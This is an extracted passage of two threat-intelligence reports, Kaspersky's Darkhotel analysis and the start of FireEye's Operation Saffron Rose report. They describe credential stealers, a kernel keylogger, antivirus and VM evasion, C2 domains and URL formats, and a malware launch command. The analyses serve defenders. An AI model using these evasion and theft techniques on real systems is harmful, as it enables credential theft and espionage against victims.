on current system. Bdagent.exe is a name for BitDefender Antivirus component.
If it is running, it uses simple AV heuristics evasion technique. The code starts a
thread that simulates keystrokes of ESC keyboard key and then shows a system
modal message box. Pushing ESC key closes the modal message box. Right after
that keystroke generation thread is terminated and the module continues normal
execution as if 
bdagent.exe
 was not running.
Next the module makes sure only one instance of current code is running by
checking if system mutex object named 
920111215
 exists. After that, the mod-
ule collects information about current system which includes the following:
Network adapter MAC address
CPU Name and Identifier
System default codepage
Windows OS and Service Pack versions
    
Hostname and IP address
     
Local user name
      
Cached passwords from Internet Explorer 6/7/8/9 (Protected Storage and
        IntelliForms)
TLP: Green
                For any inquiries, please contact intelreports@kaspersky.com
                                                                                  61
 Mozilla Firefox stored secrets (<12.0)
 Chrome stored secrets
 MS Outlook Express accounts
 MS Windows Mail accounts
 MS Windows Live Mail accounts
 MS Outlook accounts (SMTP/IMAP/POP3/HTTP)
 MSN Messenger
 Gmail Notifier credentials
 Google Desktop accounts
 Google Talk accounts
If the module reveals that current System default codepage is 0412 (Korean) it
terminates.
There is one interesting specifics in Microsoft IntelliForms which reveals attack-
s interests. IntelliForms technology keeps login/password information in the
registry in encrypted form. However, there is no clear information about the corre-
sponding website which requires given login and password. The only information
Intelliforms offers about the place where given login/password should be used
is a hash of the webpage URL. So far, the attackers can steal logins and pass-
words but to understand where they are from they must guess the string which
produced given hash. They have implemented this logics in the malware. When
IntelliForms information is stolen the malware tries to check the list of known
login page URLs to recover the originating webpage address. Here is the list of
URLs that are checked by the malware:
TLP: Green
               For any inquiries, please contact intelreports@kaspersky.com
The list of targeted services includes some local services specifically popular in:
United States
Russia
China
Japan
Middle Eastern countries
India
The module uses several simple XOR
based algorithms to encrypt embedded
string data. String encryption/decryption functions use the following keys:
Microsoft Corporation. All rights reserved.
90ed768ab728a0f74a4b957c31f1a213
TLP: Green
               For any inquiries, please contact intelreports@kaspersky.com
                                                                                    63
The module works with all Firefox versions prior to Mozilla Firefox 12.0. Depend-
ing on version of Firefox, it can read Firefox database directly to dump stored se-
crets or utilize one Firefox libraries to access the configuration data. In addition it
makes use of the following Mozilla Firefox libraries depending on Firefox version:
nss3.dll
plc4.dll
mozcrt19.dll
mozutils.dll
mozglue.dll
mozsqlite3.dll
sqlite3.dll
nspr4.dll
plds4.dll
nssutil3.dll
softokn3.dll
When stealing secrets from Firefox and Chrome it uses built
in SQLite library code.
The module is linked with SQLite version 3.7.5 release candidate 2, release
hash ed759d5a9edb3bba5f48f243df47be29e3fe8cd7 dated as 2011
17:03:50.
After stealing secrets from local system the malware executes some kind of
embedded script. It is logging all actions to inform the operator what exactly was
executed by this variant of the malware. The result of this execution is appended
to the stolen data and uploaded to the C&C server.
The module uploads all collected information to one of the following URLs via
POST request:
s the first time we see .pn domain used in malware. This top level country code
domain is quite exotic and is assigned to Pitcairn Islands, which is Overseas ter-
ritory of the United Kingdom in the Pacific. As of 2013 estimated population of
Pitcairn Islands is only 56 people. An official .pn domain costs $100/year from
the registry, however .eu.pn domains seem to be given away for free.
TLP: Green
                For any inquiries, please contact intelreports@kaspersky.com
The malware uses fixed User
Agent string:
Mozilla/4.0 (compatible
 MSIE 8.0
 Windows NT 6.1
 Trident/4.0
 SLCC2
.NET
CLR 2.0.50727
 .NET CLR 3.5.30729
 .NET CLR 3.0.30729
 Media Cen-
ter PC 6.0)
The data is uploaded as a POST request binary in the following format:
<UserId>
<UniqueMachineId>
<EncryptionKey>
<GeneralSysInfo>
where <UserId> is hardcoded identifier (i.e. 
user2
 in current sample)
<UniqueMachineId> is a 32 characters long hex string which derived from net-
work card MAC address
 <EncryptionKey> is symmetrical encryption key used to
encrypt <UserId> and <GeneralSysInfo> values. The malware uses text protocol,
which is why potentially binary values of <UserId> and <GeneralSysInfo> are ad-
ditionally encoded using Base64 algorithm.
<GeneralSysInfo> field contains only basic information about the system, i.e.:
Info
Sys@User : MYCOMPUTER@MyUser (0850)
C P U : Intel(R) Core(TM) i3
1667U CPU @ 1600GHz
System OS: Microsoft Windows XP (Service Pack 3)
Net card : 192.168.0.2 (133773311337)
If the server reply contains a keyword 
minmei
 it continues sending additional in-
formation. 
Minmei
 may be a reference to a popular Japanese anime and manga
known as 
The Super Dimension Fortress Macross
. A quote from Wikipedia:
Born in Yokohama Chinatown, Japan (though she is of partial Chinese descent)
as Linn Minmei, Minmay moved in with her uncle Shaochin (
) and aunt Feic-
hun (
) on South Ataria Island in hopes of finding the path to fulfill her dream
of becoming a star.
Trojan.Win32.Karba.e
Filename       MD5                                 Link Time (UTC)          Linker
acroedit.exe   0fe3daf9e8b69255e592c8af97d24649    2013.10.29 00:21:48      6.0
Technical Notes
The trojan iterates through running processes and looks for security software
basing on executable filenames from the list below. If the process is found it
keeps a record of the software name using short AV Identifier string from the fol-
lowing table of rules
TLP: Green
                For any inquiries, please contact intelreports@kaspersky.com
                                                                                 65
Process Name               AV Identifier                Company Name, Country
ekrn.exe                   NOD                          ESET, Czech Republic
NVCAgent.npc               NV                           Naver NHN, Vietnam
360tray.exe                36                           Qihoo 360, China
msseces.exe                MS                           Microsoft, USA
uiWinMgr.exe               TR                           TrendMicro, Japan
AvastSvc.exe               AST                          Avast, Czech Republic
RsMgrSvr.exe               RS                           Rising, China
mcagent.exe                MC                           McAfee, USA
avgidsagent.exe            AV                           AVG, Czech Republic
ccsvchst.exe               NT                           Symantec, USA
bdagent.exe                BD                           BitDefender, Romania
avp.exe                    KS                           Kaspersky, Russia
V3LTray.exe                V                            AhnLab, South Korea
AYAgent.aye                AY                           ESTSoft, South Korea
The malware uses a trick to evade running on a VMware. First, it checks if cur-
rent process is running in WOW64 environment. If yes it does additional port
I/O specific to VMWare virtual machine (the VMware hypervisor port: 0x5658
VMware hypervisor magic value: 0x564D5868). Another method to detect VM en-
vironment is to check local network adapter
s IP address. If it belongs to subnet
192.168.100.* then the malware believes it
s running in a VM. If VM is detected
the process instantly terminates.
Next the malware submits collected information to the C&C server using HTTP
GET request and the following URL format: http://<C2DOMAIN>/bin/read_i.php
TLP: Green
              For any inquiries, please contact intelreports@kaspersky.com
?a1=%STEPID%&a2=%HOSTID%&a3=%SYSINFO%&a4=% AVSOFTID%, where
%C2DOMAIN% is one of the following C&C domains:
micronaoko.jumpingcrab.com
microchsse.strangled.net
microbrownys.strangled.net
microplants.strangled.net
microlilics.crabdance.com
%STEPID% is special text string indicating stage of malware operation. This string
varies depending on the local system language and may be one of the following:
step2-down-k
 for codepage 0412 (Korean)
step2-down-j
 for codepage 0411 (Japanese)
step2-down-u
 for codepage 0409 (English,US)
step2-down-r
 for codepage 0419 (Russian)
step2-down-c
 for codepage 0804 (Chinese)
step2-down-b
 for codepage 0409 (English,US)
step2-down
 for other codepages
%HOSTID% is a special value generated from local network card MAC address
%SYSINFO% is a string with general system information (please see description
above)
TLP: Green
               For any inquiries, please contact intelreports@kaspersky.com
                                                                                     67
%AVSOFTID% is a string that contains indexes of AV software names in internal
table of AV Identifiers (please see the table above).
Selective Infector
Technical Notes
Igfxext.exe can download a file and drop it to %APPDATA%\microsoft\dis-
play\ctfmon.exe (md5= e8bfb82b0dd5cef46116d61f62c25060). After
execution, the downloaded file drops SMAGENT.EXE (md5 0306f9ae-
7786570139f78e78bc940597) to %APPDATA%\MICROSOFT\DISPLAY and ex-
ecutes it. This component is a virus, and is used to selectively infiltrate into other
computers via USB or network shares.
Trojan-Dropper & Injector (infected legitimate files)
Technical Notes
A large number of files are detected by Kaspersky Lab scanners as Virus.Win32.
Pioneer.dx. These files are all legitimate files that have been infected by another
Darkhotel component. All of these infected files drop a 63kb self injecting compo-
nent.
Filename      MD5                                  Link Time (UTC)          Linker
igfxext.exe   fcd2458376398b0be09eaa34f4f4d091     2012:07:27 17:10:30      6.0
This malware is 63kb in size. It is bound to a variety of other software packages
that vary in name, but the host package is consistently detected as 
Virus.Win32.
Pioneer.dx
. The igfxext.exe component is dropped to disk and run. It spawns an-
other suspended process with its own igfxext.exe image, but decrypts a smaller
32kb executable (cf1319d94f33380622ba000b7d8ad6e9,Trojan
Downloader.
Win32.Agent.xwge) from its .data section in memory with a simple xor 0xbb. The
running process overwrites the igfxext.exe image in the suspended process with
this smaller chunk of code. It then resumes the thread in the new process.
This smaller code section maintains similar functionality to the 
worm
 compo-
nent:
 ASICAPI window creation and update
VMWare detection/red pill
AV check
TLP: Green
                For any inquiries, please contact intelreports@kaspersky.com
 maup3.exe checks
 roto.dat check
 ystem information collection, encryption with
      
ab911001f78ad31552e47205ecc46466
 key and transfer to c2
Host package files detected as 
Virus.Win32.Pioneer.dx
 are infected legitimate
files, that do not have any self
propagation routines.
Enhanced Keyloggers and Development
Technical Notes
It is signed with the familiar 
                                    
 digital certificate.
77669d11c3248a6553d3c15cd1d8a60e 
csmrs.exe, 478.8kb,
CompliedOn:2010
11 08:46:47
Signed by                        certificate.
This sample is started by code running within svchost.exe on WinXP SP3. It drops
a keylogger. The debug path inside:
 d:\KerKey\KerKey(
)\KerKey\release\KerKey.pdb
Note 
means 
General
 in Korean
The dropper above maintains, drops and installs this kernel mode keylogger:
md5: 86b18e99072ba72d5d36bce9a00fc052 filename: ndiskpro.sys
size: 295kb
CompiledOn:2009
24 11:56:22
Likely, it was developed as a part of a mid
late 2009 project:
 e:\project\2009\x\total_source\32bit\ndiskpro\src\ioman.c
Keylogger Code
This driver package is built to look like a legitimate low level Microsoft system
device. It is installed as a system kernel driver 
Ndiskpro
 service, described as
Microcode Update Device
. It is somewhat surprising that there is no rootkit
functionality hiding this service:
TLP: Green
                 For any inquiries, please contact intelreports@kaspersky.com
                                                                                 69
When loaded, the NDISKPRO.SYS driver hooks both INT 0x01 and INT 0xff, and
retrieves keystroke data directly from port 0x60, the motherboard keyboard con-
troller itself. Here we see the local port variables assigned values
And here, the ports are directly being read with READ_PORT_UCHAR(0x64) and
then READ_PORT_UCHAR(0x60):
It buffers, then communicates the data to the running user mode component.
This component then encrypts and writes the retrieved values ondisk to a ran-
TLP: Green
              For any inquiries, please contact intelreports@kaspersky.com
domly named .tmp, file like ffffz07131101.tmp. This file is located in the same
directory as the original dropper, which maintains persistence across reboots with
a simple addition to the HKCU run key.
Here is debug output demonstrating this component
s data retrieval when the
letter 
 is repeatedly pressed on the keyboard. Keyscan make and break codes
are 
0x20
 and 
0xA0
 and for the key press and key release for the 
 key. The
0x1D
 value from port 0x64 that you see below is basically an indication that
the output buffer is full and the keyboard is locked, so it is safe for the driver to
access the key value in port 0x60:
0x60 port access, data = 0x20
   0x64 port access, data = 0x1D
   0x64 port access, data = 0x1D
0x60 port access, data = 0xA0
   0x64 port access, data = 0x1D
   0x64 port access, data = 0x1D
0x60 port access, data = 0x20
   0x64 port access, data = 0x1D
   0x64 port access, data = 0x1D
0x60 port access, data = 0xA0
   0x64 port access, data = 0x1D
   0x64 port access, data = 0x1D
TLP: Green
                For any inquiries, please contact intelreports@kaspersky.com
                                                                                  71
0x60 port access, data = 0x20
   0x64 port access, data = 0x1D
   0x64 port access, data = 0x1D
0x60 port access, data = 0xA0
   0x64 port access, data = 0x1D
   0x64 port access, data = 0x1D
0x60 port access, data = 0x20
[Output DeviceObject = 0x0, bIsHidKbd = 0x0
<><><><><><><><><><><><><><><><><><><><><><><><><><><>
<><><><><><><><><><><><><><><><><><><><><><><><><><><>
DR0 = 0x60, DR1 = 0x64, DR2 = 0xF7190410, DR3 = 0x0, DR6 = 0xFFFF2FF0,
DR7 = 0x22073F
Current ISR, HighAddress = 0xf718, LowAddress = 0xf330, Flag = 0xee oldCR4 =
0x6F9
oldDR7 = 0x22073F
<><><><><><><><><><><><><><><><><><><><><><><><><><><>
<><><><><><><><><><><><><><><><><><><><><><><><><><><>
These debug messages and code style are duplicates of what chpie posted in the
past.
This keylogger module encrypts and stores gathered data in a log file, as men-
tioned previously. Its encryption algorithm is similar to RC4. Interesting part is
that the module randomly generates the key and stores it in an unexpected place:
in the middle of the log file name. Hence, the numeric part of the filename is used
as a seed for the pseudorandom number generator. Rand function is statically
linked to insure same results on different computers.
Here is the commented RC4 encryption code:
TLP: Green
               For any inquiries, please contact intelreports@kaspersky.com
TLP: Green
   For any inquiries, please contact intelreports@kaspersky.com
                                                                                 73
Appendix E. Parallel and Previous Research
Getting 
Left of Boom
: How ThreatConnect Enables Proactive Cybersecurity,
ThreatConnect February 2014
http://www.threatconnect.com/news/getting-leftof-boom-threatconnect-en-
ables-proactive-cybersecurity/
Nevermind Nenim
s hidden agenda 
we still caught it, Microsoft MMPC, April 2013
http://blogs.technet.com/b/mmpc/archive/2013/04/14/nevermind-nenim-s-
hidden-agenda-we-still-caught-it.aspx
512 Certificates abused in the wild, Fox
IT November 2011
http://blog.fox-it.com/2011/11/21/rsa-512-certificates-abused-in-the-wild/
Dec 21 CVE
2009
0556 (corrected CVE) Christmas Messages.pps with stolen cert from
Syniverse from nicholas.bennett53@hotmail.com, Contagio, December 2010
http://contagiodump.blogspot.ro/2010/12/dec-21-cve-2010-2572-christmas.html
2010
2883 Adobe 0
Day David Leadbetter
s One Point Lesson from
193.106.85.61 thomasbennett34@yahoo.com
, Contagio, Sept 2010
http://contagiodump.blogspot.ro/2010/12/dec-21-cve-2010-2572-christmas.
html
Apr 26 CVE
2010
0188 PDF North Korea Policy Piece from (fake) walterkeats@
yahoo.com, Contagio, April 2010
http://contagiodump.blogspot.com/2010/09/cve-david-leadbetters-one-point-
lesson.html
Mar 27 CVE
2010
0806 IE 0
day Dozens missing after ship sinks near North Korea
from kevin.bohn33@hotmail.com, Contagio March 2010
http://contagiodump.blogspot.com/2010/04/apr-28-cve-2010-0188-pdf-
north-korea.html
Threat Outbreak Alert: Fake North Korean Sunken Ship Report E
mail Messages
on March 27, 2010, Cisco
http://tools.cisco.com/security/center/viewThreatOutbreakAlert.x?alert
Id=20148
Security Advisory for Adobe Reader and Acrobat, Adobe, cve
2010
2883
http://www.adobe.com/support/security/advisories/apsa10-02.
html?PID=6157500
TLP: Green
              For any inquiries, please contact intelreports@kaspersky.com
Kaspersky Lab HQ
39A/3 Leningradskoe Shosse
Moscow, 125212
Russian Federation
more contact details
Tel:
+7-495-797-8700
Fax:
+7-495-797-8709
E-mail:
 info@kaspersky.com
Website:
 www.kaspersky.com
                                             SPECIAL REPORT
OPERATION
SAFFRON ROSE
2013
Authors: Nart Villeneuve, Ned Moran,
Thoufique Haq and Mike Scott
                                       SECURITY
                                       REIMAGINED
Fireeye: Operation Saffron Rose 2013
CONTENTS
Introduction................................................................................................................................................................................................................................................................................................................................................ 2
Background................................................................................................................................................................................................................................................................................................................................... 2
Attack Vectors...................................................................................................................................................................................................................................................................................................................................... 4
The 
Stealer
 Malware.................................................................................................................................................................................................................................................................................................... 6
The 
Stealer
 Builder and Tools......................................................................................................................................................................................................................................................... 11
Command-and-Control Infrastructure.................................................................................................................................................................................................................. 13
Victimology........................................................................................................................................................................................................................................................................................................................................... 15
Attribution.............................................................................................................................................................................................................................................................................................................................................. 16
Conclusion................................................................................................................................................................................................................................................................................................................................................ 19
              About FireEye, Inc.......................................................................................................................................................................................................................................................................................... 19
1 www.fireeye.com
Fireeye: Operation Saffron Rose 2013
We believe we
re seeing an evolution and development in Iranian-based cyber activity. In
years past, Iranian actors primarily committed politically-motivated website defacement
and DDoS attacks.1 More recently, however, suspected Iranian actors have destroyed data
on thousands of computers with the Shamoon virus,2 and they have penetrated the Navy
Marine Corps Intranet (NMCI), which is used by the U.S. Navy worldwide.3
                             In this report, we document the activities of the                                   Background
                             Ajax Security Team, a hacking group believed to be                                  The transition from patriotic hacking to cyber
                             operating from Iran. Members of this group have                                     espionage is not an uncommon phenomenon. It
                             accounts on popular Iranian hacker forums such as                                   typically follows an increasing politicization within
                             ashiyane[.]org and shabgard[.]org, and they have                                    the hacking community, particularly around
                             engaged in website defacements under the group                                      geopolitical events. This is followed by increasing
                             name 
AjaxTM
 since 2010. By 2014, the Ajax                                         links between the hacking community and the
                             Security Team had transitioned from performing                                      state, particularly military and/or intelligence
                             defacements (their last defacement was in                                           organizations.
                             December 2013) to malware-based espionage,
                             using a methodology consistent with other                                           In the late 1990
s and early 2000
s, a similar
                             advanced persistent threat actors in this region.                                   transition occurred within the Chinese hacking
                                                                                                                 community. During that time period, the Chinese
                             It is unclear if the Ajax Security Team operates in                                 hacking community engaged in website
                             isolation or if they are a part of a larger                                         defacements and denial of service attacks in
                             coordinated effort. The Ajax Security Team itself                                   conjunction with incidents such as the accidental
                             uses malware tools that do not appear to be                                         bombing of the Chinese embassy in Belgrade in
                             publicly available. We have seen this group                                         1999, the collision of a U.S. spy plane and a
                             leverage varied social engineering tactics as a                                     Chinese military plane in 2001, and the Japanese
                             means to lure their targets into infecting                                          Prime Minister
s controversial visit to the
                             themselves with malware. Although we have not                                       Yasukuni shrine in 2005.4 Around this time a
                             observed the use of exploits as a means to infect                                   significant shift in philosophy began to take place.
                             victims, members of the Ajax Security Team have
                             previously used publicly available exploit code in                                  Members of the Chinese hacking community that
                             web site defacement operations.                                                     participated in such attacks soon found that
                                                                                                                 transitioning to cyber espionage was more
                             In sum, FireEye has recently observed the Ajax                                      rewarding
both in terms of developing a more
                             Security Team conducting multiple cyber                                             advanced skill set as well as in monetary
                             espionage operations against companies in the                                       remuneration. One group known as NCPH
                             defense industrial base (DIB) within the Unites                                     (Network Crack Program Hacker), whose
                             States, as well as targeting local Iranian users of                                 founding member 
Wicked/Withered Rose
 was a
                             anti-censorship technologies that bypass Iran
s                                     patriotic hacker, made the transition to cyber
                             Internet filtering system.                                                          espionage by founding a 
hacker-for-hire
 group
                             1 HP Security Research. 
Threat Intelligence Briefing Episode 11
. February 2014.
                             2 Perlroth, N. 
In Cyberattack on Saudi Firm, U.S. Sees Iran Firing Back
. October 2012.
                             3 Gallagher, S. 
Iranians hacked Navy network for four months? Not a surprise
. February 2014.
                             4 Key. 
Honker Union of China to launch network attacks against Japan is a rumor
. September 2010.
2 www.fireeye.com
Fireeye: Operation Saffron Rose 2013
                             that simultaneously developed an association with                                  Foreign news and opposition websites are
                             the Chinese military.5 The group began developing                                  routinely blocked in Iran, as are the tools that
                             zero-day exploits, rootkits and remote access                                      allow users in Iran to bypass these restrictions.11
                             tools (RATs)
using them in attacks against a                                       One of the key stakeholders in Iran
s Internet
                             variety of targets including the U.S. Department of                                censorship program is the Iranian Revolutionary
                             Defense.6 (One of this group
s associates, 
, is                               Guard Corps (IRGC), under which the Basij
                             still active and is believed to have developed one                                 paramilitary organization operates.
                             variant of the PlugX/SOGU malware.7) The
                             rationale behind this transition within the Chinese                                The Basij formed the Basij Cyber Council and
                             hacking community is nicely summed up in a                                         actively recruits hackers in order to develop both
                             message by the 
Honker Union of China
 to its                                      defensive and offensive cyber capabilities.12 There
                             members in 2010:                                                                   is increasing evidence to suggest that the hacker
                                                                                                                community in Iran is engaged in a transition from
                             What benefit can hacking a Web page bring our                                      politically motivated defacements and denial of
                             country and the people? It is only a form of                                       service attacks to cyber espionage activities. This
                             emotional catharsis, please do not launch any                                      model is consistent with the Basij
s recruitment of
                             pointless attacks, the real attack is to fatally                                   paramilitary volunteer hackers to 
engage in less
                             damage their network or gain access to their                                       complex hacking or infiltration operations
 leaving
                             sensitive information.8                                                            the more technical operations to entities over
                                                                                                                which they have increasingly direct control.13
                             In Iran, the hacking community appears to be
                             undergoing a similar transformation. While a                                       As such, the capabilities of threat actors operating
                             variety of Iranian hacker groups had engaged in                                    from Iran have traditionally been considered
                             politically motivated website defacements, the                                     limited.14 However, the 
Shamoon
 attacks, which
                             emergence of the 
Iranian Cyber Army
 in 2009                                      wiped computers in Saudi Arabia and Qatar,
                             demonstrated 
a concentrated effort to promote                                     indicate an improvement in capabilities.15 And
                             the Iranian government
s political narrative                                       unsurprisingly, Iran has reportedly increased its
                             online
.9 They targeted, among others, news                                        efforts to improve offensive capabilities after
                             organizations, opposition websites and social                                      being targeted by Stuxnet and Flame.16
                             media.10 This marked the beginning of a large-
                             scale cyber offensive against the perceived
                             enemies of the Iranian government.
                             5
   Elegant, S. 
Enemies at The Firewall
. December 2007. Dunham, K. & Melnick, J. 
Wicked Rose
 and the NCPH Hacking Group
                                  Wikipedia. 
Network Crack Program Hacker Group
                             6
   Dunham, K. & Melnick, J. 
Wicked Rose
 and the NCPH Hacking Group
                             7
   Blasco, J. 
The connection between the Plugx Chinese gang and the latest Internet Explorer Zeroday
. September 2012.
                             8
   Key. 
Honker Union of China to launch network attacks against Japan is a rumor
. September 2010.
                             9
   OpenNet Initiative. 
After the Green Movement: Internet Controls in Iran 2009 
 2012
. February 2013.
                             10
 Rezvaniyeh, F. 
Pulling the Strings of the Net: Iran
s Cyber Army
. February 2010. 
Twitter hackers appear to be Shiite group
. December 2009.
                             11
 OpenNet Initiative. 
Iran
. June 2009.
                             12
 The IRGC has also indicated that they would welcome hackers that support the Iranian government. Esfandiari, G.
                                  
Iran Says It Welcomes Hackers Who Work For Islamic Republic
. March 2011, HP Security Research.
                                  
Threat Intelligence Briefing Episode 11
. February 2014.
                             13
 BBC Persian. 
Structure of Iran
s Cyber Warfare
                             14
 Mandiant. 
M-Trends: Beyond the Breach, 2014
, page 9. April 2014.
                             15
 Mount, M. 
U.S. Officials believe Iran behind recent cyber attacks
. October 2012.
                             16
 Shalal-Esa, A. 
Iran strengthened cyber capabilities after Stuxnet: U.S. general
. January 2013, Lim, K. 
Iran
s cyber posture
. November 2013.
3 www.fireeye.com
Fireeye: Operation Saffron Rose 2013
                             Attack Vectors                                                                 registered the domain 
aeroconf2014[.]org
                             We have observed the Ajax Security Team use a                                  order to impersonate the IEEE Aerospace
                             variety of vectors to lure targets into installing                             conference
the conference
s actual domain is
                             malicious software and/or revealing login                                      aeroconf.org
and sent out an email with the
                             credentials. These attack vectors include sending                              following information:
                             email, private messages via social media, fake login
                             pages, and the propagation of anti-censorship                                  From: invite@aeroconf2014[.]org
                             software that has been infected with malware.                                  Subject: IEEE Aerospace Conference 2014
                             Spear phishing                                                                 The email encouraged users to visit a fake
                             During our investigation, we discovered that these                             conference website owned by the attackers:
                             attackers sent targeted emails, as well as private
                             messages through social media. For example, the                                Upon visiting the website, visitors were notified
                             attackers targeted companies in the DIB using a                                that they must install 
proxy
 software in order to
                             fake conference page as a lure to trick targets into                           access it, which is actually malware.
                             installing malicious software. The attackers
  Figure 1: The Fake
  IEEE Aerospace
  Conference Website
                             7
                                 Bloomberg. 
Neiman Marcus Hackers Set Off 60,000 Alerts While Bagging Credit Card Data.
 February 2014.
4 www.fireeye.com
Fireeye: Operation Saffron Rose 2013
                             Credential Phishing                                                                   political opposition.18 In response to these
                             The attackers have also used phishing attacks, in                                     restrictions, Iranians have been increasingly using
                             which they set up Web pages to emulate various                                        software that bypasses such filtering technology.
                             services that require security credentials. The
                             attackers tailored these login pages for specific                                     To counter anti-censorship efforts, Iran has
                             targets in the DIB and spoofed a variety of services                                  attempted to block the use of certain software
                             such as Outlook Web Access and VPN login pages.                                       tools.19 In 2012, researchers found that an
                                                                                                                   anti-censorship tool that is primarily used by
                             If users attempt to login through these fake Web                                      Internet users in Iran was bundled with malware
                             pages, the attackers collect their login credentials.                                 and redistributed.20
                             Anti-censorship Tools                                                                 Our investigation found that malware-laden
                             All Internet Service Providers (ISPs) in Iran are                                     versions of legitimate anti-censorship software,
                             required to implement filtering technology that                                       such as Psiphon and Ultrasurf, were distributed to
                             censors access to content which the Iranian                                           users Iran and Persian speaking people around the
                             government deems unacceptable.17 This content                                         world.
                             includes categories such as pornography and
  Figure 2: The Fake Outlook
  Web Access page
                             17 OpenNet Initiative. 
Iran
. June 2009.
                             18 OpenNet Initiative. 
After the Green Movement: Internet Controls in Iran 2009 
 2012
. February 2013.
                             19 Torbati, Y. 
Iran blocks use of tool to get around Internet filter
. March 2013.
                             20 Marquis-Boire, M. 
Iranian anti-censorship software 
Simurgh
 circulated with malicious backdoor
. May 2012.
5 www.fireeye.com
Fireeye: Operation Saffron Rose 2013
                             The 
Stealer
 Malware                                        The IntelRS.exe is written in .NET and is aptly
                             Host-based Indicators and Malware                            named 
Stealer
, as it has various data collection
                             Functionality                                                modules. It drops and launches AppTransferWiz.dll
                             We have observed the Ajax Security Team use a                via the following command:
                             malware family that they identify simply as 
Stealer
                             They deliver this malware as a malicious executable          
C:\WINDOWS\system32\rundll32.exe
                             (dropper). The executable is a CAB extractor that            Documents and Settings\{USER}\Application
                             drops the implant IntelRS.exe. This implant, in turn,
                             drops various other components into C:\                      Data\IntelRapidStart\AppTransferWiz.dll
,#110
                             Documents and Settings\{USER}\Application
                             Data\IntelRapidStart\. The following files are               110 is an ordinal that corresponds to 
StartBypass
                             written to disk in this location:                            export in AppTransferWiz.dll.
                                             File                                               Functionality
                               IntelRS.exe             Various stealer components and encryption implementation
                               DelphiNative.dll        Browser URL extraction, IE Accounts, RDP accounts (Imported by IntelRS.exe)
                               IntelRS.exe.config      Config containing supported .NET versions for IntelRS.exe
                               AppTransferWiz.dll      FTP exfiltration (Launched by IntelRS.exe)
                               RapidStartTech.stl      Base64 encoded config block containing FTP credentials, implant name, decoy name, screenshot
                                                       interval and booleans for startup, keylogger and screenshot
  Figure 3: StartBypass
  Ordinal
6 www.fireeye.com
Fireeye: Operation Saffron Rose 2013
                             Data exfiltration is conducted over FTP by              
   Takes various screenshots
                             AppTransferWiz.dll, which acts as an FTP client.
                             This DLL is written in Delphi. There is code to         
   Harvests instant messaging (IM) account
                             exfiltrate data over HTTP POST as well, but it is            information: GTalk, Pidgin, Yahoo, Skype
                             unused. We also found incomplete code that would
                             perform SFTP and SMTP exfiltration, which could         
   Tracks credentials, bookmarks and history
                             be completed in a future version.                            from major browsers: Chrome, Firefox, Opera
                             State is maintained between the stealer                 
   Collects email account information
                             component IntelRS.exe and the FTP component
                             AppTransferWiz.DLL using a file from the FTP            
   Extracts installed proxy software
                             server 
sqlite3.dll
, as well as a global atom               configuration information
                             
SQLiteFinish
. IntelRS.exe waits in an indefinite
                             loop, until AppTransferWiz.DLL defines this state.      
   Harvests data from installed cookies
                             Once the state is set, IntelRS.exe proceeds to          IntelRS.exe loads a Delphi component called
                             collect data from various areas in the system as        DelphiNative.DLL, which implements some
                             described below:                                        additional data theft functionality for the following:
                             
    Collects system information: hostname,            
   Internet Explorer (IE) accounts
                                   username, timezone, IP addresses, open ports,
                                   installed applications, running processes, etc.   
   Remote Desktop Protocol (RDP) accounts
                             
    Performs key logging                              
   Browser URLs
  Figure 4: AppTransferWizard.
  dll creates sqlite3.dll and
  global atom
  Figure 5: IntelRS.exe sleeps
  until global atom is set and
  sqlite3.dll is present
7 www.fireeye.com
Fireeye: Operation Saffron Rose 2013
                                The Stealer component uses common techniques                      Analysis of the malware indicates that the data is
                                to acquire credential data. For instance, it loads                encrypted via a Rijndael cipher implementation;
                                vaultcli.DLL and uses various APIs shown below to                 more specifically it uses AES which is a specific set
                                acquire RDP accounts from the Windows vault.                      of configurations of Rijndael. It uses a key size of
                                                                                                  256 bytes and block size of 128 bytes, which
                                Harvested data is encrypted and written to disk on                conforms to the FIPS-197 specification of
                                the local host. The filenames for these encrypted                 AES-256.21 It utilizes the passphrase 
HavijeBaba
                                files follow this naming scheme:                                  and a salt of 
salam!*%#
 as an input to PBKDF2
                                                                                                  (Password-Based Key Derivation Function 2) to
                                {stolen data type}_{victim system name}_                          derive the key and initialization vector for the
                                YYYYMMDD_HHMM.Enc                                                 encryption.22 This key derivation implementation in
                                                                                                  .NET is done using the Rfc2898DeriveBytes
                                The {stolen data type} parameter indicates where                  class.23 The passphrase and salt are Persian
                                the data was harvested from (e.g., a Web browser,                 language words. 
Havij
 means 
carrot
Baba
                                an instant messenger application, installed proxy                 means 
father
, and 
Salam
 is a common greeting
                                software).                                                        that means 
Peace
  Figure 6: Acquiring RDP
  Accounts
                        21
                             ShawnFa. 
The Differences Between Rijndael and AES
. October 2006.
                        22
                             Wikipedia. 
PBKDF2
                        23
                             Microsoft. 
Rfc2898DeriveBytes Class
8 www.fireeye.com
Fireeye: Operation Saffron Rose 2013
                             Sample Timeline                                        Spoofed Installers
                             We identified 17 droppers during this research,        Many of the malicious executables (droppers) that
                             including:                                             we collected were bundled with legitimate
                                                                                    installers for VPN or proxy software. Examples
                             
    9 samples compiled on 2013-02-17 07:00           include:
                             
    4 samples compiled on 2009-07-13 23:42           
   6dc7cc33a3cdcfee6c4edb6c085b869d was
                                                                                         bundled with an installer for Ultrasurf Proxy
                             
    3 sample compiled on 2013-10-14 06:48                 software.
                             
    1 sample compiled on 2013-10-13 09:56            
   3d26442f06b34df3d5921f89bf680ee9 was
                                                                                         bundled with an installer for Gerdoovpn
                             The 2009 compile time appears to have been                  virtual private network software.
                             forged, while the 2013 compile times may be
                             legitimate.                                            
   3efd971db6fbae08e96535478888cff9 was
                                                                                         bundled with an installer for the Psiphon
                             In some cases, we found an implant but not the              proxy.
                             parent dropper. In total, 22 of the 23 implants that
                             we identified during our research had unique           
   288c91d6c0197e99b92c06496921bf2f was
                             compile times ranging from 2013-10-29 until                 bundled with an installer for Proxifier
                             2014-03-15. We identified two implants that were            software.
                             both compiled on 2014-3-15 at 23:16. These
                             compile times appear to be legitimate and coincide     These droppers were also designed to visually
                             with attempted intrusion activity attributed to        spoof the appearance of the above applications.
                             these attackers.                                       These droppers contained icons used in the
                                                                                    legitimate installers for these programs.
  Figure 7: Icon for the Psiphon
  Anti-censorship Tool
9 www.fireeye.com
Fireeye: Operation Saffron Rose 2013
                             Process Debug (PDB) Strings
                             Analysis of the PDB strings seen in the implants      VS_VERSION_INFO
                             indicates that there may be more than one             VarFileInfo
                             developer working on the source code for the          Translation
                             Stealer builder. The following two PDB paths were     StringFileInfo
                             seen in the collection of implants that we            000004b0
                             collected:                                            Comments
                                                                                   Process for Windows
                             
